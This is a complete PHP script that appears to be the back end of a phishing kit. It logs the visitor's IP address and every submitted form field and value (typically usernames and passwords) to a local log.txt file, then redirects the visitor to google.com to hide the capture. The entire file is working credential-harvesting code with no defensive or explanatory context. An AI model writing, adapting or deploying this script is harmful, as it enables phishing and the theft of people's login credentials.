<?php
function grabip(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

header ('Location:https://google.com/');
$handle = fopen("log.txt", "a");
fwrite($handle, "IPAddress : ".grabip()."\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, " : ");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n=========================================");
fclose($handle);
exit;
?>
